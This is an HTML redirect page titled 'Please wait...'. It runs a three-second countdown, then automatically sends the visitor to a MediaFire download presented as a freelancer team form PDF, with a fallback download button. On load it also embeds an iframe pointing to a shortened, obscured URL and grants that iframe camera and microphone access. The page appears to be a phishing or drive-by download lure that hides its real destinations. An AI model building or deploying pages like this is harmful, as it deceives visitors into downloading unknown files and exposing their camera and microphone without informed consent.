<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Please wait...</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background: #111827;
      color: white;
      font-family: Arial, sans-serif;
    }

    .box {
      width: 90%;
      max-width: 500px;
      text-align: center;
      padding: 30px 20px;
      border-radius: 18px;
      background: #1f2937;
      box-shadow: 0 10px 35px rgba(0, 0, 0, 0.35);
    }

    h2 {
      margin-top: 0;
    }

    #countdown {
      font-size: 40px;
      font-weight: bold;
      margin: 20px 0;
    }

    iframe {
      width: 100%;
      height: 180px;
      border: 0;
      border-radius: 12px;
      margin-top: 10px;
    }

    .fallback {
      display: none;
      margin-top: 20px;
    }

    button {
      border: 0;
      padding: 12px 22px;
      border-radius: 10px;
      background: #2563eb;
      color: white;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background: #1d4ed8;
    }
  </style>
</head>

<body>

  <div class="box">

    <h2>Please wait...</h2>

    <div id="countdown">3</div>

    <p>Loading the next page...</p>

    <!-- Link 1 -->
    <iframe
      src="https://rb.gy/wkpsot"
      allow="camera; microphone"
      title="Link 1">
    </iframe>

    <!-- Fallback button -->
    <div class="fallback" id="fallback">

      <p>
        If the download page didn't open automatically:
      </p>

      <button type="button" onclick="openLink2()">
        Open Download
      </button>

    </div>

  </div>


  <script>

    // Link 2
    const link2 =
      "https://www.mediafire.com/file/9d3onww0beug85e/NB+Freelancer+Team+Form.pdf/file";


    let seconds = 3;

    const countdown =
      document.getElementById("countdown");

    const fallback =
      document.getElementById("fallback");


    // Countdown
    const timer = setInterval(() => {

      seconds--;

      countdown.textContent = seconds;


      if (seconds <= 0) {

        clearInterval(timer);

        openLink2();

      }

    }, 1000);


    // Open Link 2
    function openLink2() {

      window.location.href = link2;


      // Show fallback button
      setTimeout(() => {

        fallback.style.display = "block";

      }, 1500);

    }

  </script>

</body>
</html>
